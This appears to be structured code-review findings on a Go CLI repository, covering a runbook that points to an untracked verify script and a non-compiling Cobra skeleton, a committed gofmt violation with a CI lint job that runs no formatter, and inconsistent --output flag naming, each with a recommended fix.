unverifiedFindings.detail: The runbook's mandatory Step B says: "Run the unified verification script ... `./.claude/skills/test-clearcutt/scripts/verify.sh`" — but `.gitignore` line 18 ignores `.claude/*` and `git ls-files` confirms nothing under `.claude/` is tracked, so the canonical "Ecosystem Smoke Gating" does not exist in a clean clone or any fork. Worse, the "Example Cobra Subcommand Skeleton" uses `func init() { ... rootCmd.AddCommand(myCmd) }` against a package-level `rootCmd` that does not exist; the real pattern is `NewXCmd()` constructors registered inside `NewRootCmd()` (root.go uses `add("group", NewXCmd())`). Copying the runbook verbatim produces code that fails to compile — exactly the drift this repo's own doc-gate philosophy exists to prevent, in the `.agents/` directory the project showcases as its AI-assisted contribution story.
unverifiedFindings.recommendation: Commit the verify script into the repo (e.g., `scripts/verify-ecosystem.sh`) and have the local skill call it, then update the runbook reference; rewrite the skeleton to the `NewMyCmd() *cobra.Command` constructor + `root.go` registration pattern, and mention the `commandtree_test.go` help-render guard new commands must pass.

unverifiedFindings.title: Committed gofmt violation, and the "Go Lint" CI job runs no formatter or linter
unverifiedFindings.detail: `gofmt -l .` in cli/ flags `internal/commands/list.go` — line 75 has a mis-indented comment (`\t\t\t// Render the default table view.` inside a `default:` case). The pr-gate job is literally named "Go Lint, Build, Test & Drift Guard" but its only static check is `go vet ./...`; there is no gofmt or golangci-lint step, so unformatted code merges silently. The .agents runbook even tells contributors "If formatting checks fail (gofmt)..." — describing a gate that does not exist.
unverifiedFindings.recommendation: Run `gofmt -w internal/commands/list.go`, then add a CI step `test -z "$(gofmt -l .)"` (or adopt golangci-lint with gofmt+govet enabled) in the go-ci job so the job name matches reality.

unverifiedFindings.title: --output means four different things; out/out-dir/work-dir variants drift, and `platform status --output` names a read-only input directory
unverifiedFindings.detail: Across the command surface there are 14 `--output` flags (usually a write directory), 3 `--out-dir`, 2 `--out`, and 2 `--work-dir`. The worst case is `platform status --output` = "Repository root to inspect" — an output flag on a read-only command — which README/docs route every platform owner through (`platform status --output "$PWD"`). The confusion is proven in-repo: validate-doc-commands.sh has a dedicated drift rule (`check_absent "platform status --output .. --fleet-config ..."`) added specifically because documenting this flag wrong is easy.
